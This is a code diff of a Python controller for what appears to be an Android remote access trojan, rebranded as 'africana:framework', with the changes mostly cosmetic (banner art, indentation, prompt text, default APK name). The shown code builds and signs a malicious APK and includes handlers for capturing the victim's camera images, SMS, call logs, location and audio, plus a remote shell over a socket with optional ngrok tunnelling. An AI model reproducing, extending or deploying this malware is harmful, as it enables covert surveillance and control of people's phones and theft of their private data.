@@ -19,17 +19,28 @@ import queue
 sys.stdout.reconfigure(encoding='utf-8')
 
 banner = """\033[1m\033[91m
-                   _/﹋\_
-                   (҂`_´)
-                  <,︻╦╤─ ҉- [ John 3:16  ]
-                   _/﹋\_                ]
-                  [ Jesus Christ said;   ]
-                  [ Defeat the devil by  ]
-                  [ fasting and praying. ]
-\033[93m
-                     africana:framework
+                                                     ___
+                                                  ,o88888
+                                               ,o8888888'
+                         ,:o:o:oooo.        ,8O88Pd8888"
+                     ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"
+                   ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"
+                  , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"
+                 , ..:.::o:ooOoOO8O888O8O,COCOO"
+                , . ..:.::o:ooOoOOOO8OOOOCOCO"
+                 . ..:.::o:ooOoOoOO8O8OCCCC"o
+                    . ..:.::o:ooooOoCoCCC"o:o
+                    . ..:.::o:o:,cooooCo"oo:o:
+                 `   . . ..:.:cocoooo"'o:o:::'
+                 .`   . ..::ccccoc"'o:o:o:::'
+                :.:.    ,c:cccc"':.:.:.:.:.'
+              ..:.:"'`::::c:"'..:.:.:.:.:.'
+            ...:.'.:.::::"'    . . . . .'
+           .. . ....:."' `   .  . . ''
+         . . . ...."'
+         .. . ."'
+        .
 \033[32m
-         ~>[ Salvation is free. Get it for free. ]<~
           __                 _____ _____     _     _
        __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
       |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
@@ -84,7 +95,7 @@ def executeCMD(command,queue):
 
 
 def getpwd(name):
-	return os.getcwd()+direc+name;
+    return os.getcwd()+direc+name;
 
 def help():
     helper="""
@@ -120,7 +131,7 @@ def getImage(client):
     if imageBuffer=="":
         print(stdOutput("error")+"Unable to connect to the Camera\n")
         return
-    with open(filename,'wb') as img:    
+    with open(filename,'wb') as img:
         try:
             imgdata = base64.b64decode(imageBuffer)
             img.write(imgdata)
@@ -146,7 +157,7 @@ def readSMS(client,data):
             flag = 1
             print(stdOutput("error")+"Unable to decode the SMS\n")
     if flag == 1:
-    	os.remove(filename)
+        os.remove(filename)
 
 def getFile(filename,ext,data):
     fileData = "Dumps"+direc+filename+"."+ext
@@ -206,7 +217,7 @@ def shell(client):
             client.send("test\n".encode("UTF-8"))
             clear()
         else:
-            client.send(command.encode("UTF-8"))        
+            client.send(command.encode("UTF-8"))
 
 def getLocation(sock):
     msg = "start"
@@ -253,7 +264,7 @@ def stopAudio(client):
         try:
             audioData = base64.b64decode(data)
             audio.write(audioData)
-            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m" + (filename))
         except binascii.Error:
             flag=1
             print(stdOutput("error")+"Not able to decode the Audio File")
@@ -288,16 +299,16 @@ def callLogs(client):
     msg = recvall(client)
     filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
     if "No call logs" in msg:
-    	msg.split("\n")
-    	print(msg.replace("END123","").strip())
-    	print(" ")
+        msg.split("\n")
+        print(msg.replace("END123","").strip())
+        print(" ")
     else:
-    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
-    		txt.write(msg)
-    		txt.close()
-    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
-    		if not os.path.getsize(filename):
-    			os.remove(filename)
+        with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
+            txt.write(msg)
+            txt.close()
+            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
+            if not os.path.getsize(filename):
+                os.remove(filename)
 
 def get_shell(ip,port):
     soc = socket.socket() 
@@ -343,7 +354,7 @@ def get_shell(ip,port):
                 help()
             else:
                 print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
-            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
+            message_to_send = input("\033[92m(\033[0mafricana:\033[36mframework\033[92m)# ") + "\n"
             conn.send(message_to_send.encode("UTF-8"))
             if message_to_send.strip() == "exit":
                 print(" ")
@@ -356,7 +367,6 @@ def connection_checker(socket,queue):
     conn, addr = socket.accept()
     queue.put([conn,addr])
     return conn,addr
-
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
     print(banner)
@@ -377,7 +387,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     #version_no = re.search(pattern, java_version.stderr).groups()[0]
     # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
-    outFileName = output if output else "karma.apk"
+    outFileName = output if output else "africana.apk"
     que = queue.Queue()
     t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
     t.start()
@@ -386,16 +396,16 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     print(" ")
     resOut = que.get()
     if not resOut.returncode:
-        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
+        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m" + (outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
+        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a " + outFileName + " --overwrite",que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
         print(" ")
         resOut = que.get()
         if not resOut.returncode:
-            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
+            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m" + outFileName+"\033[0m")
             if ngrok:
                 clear()
                 get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
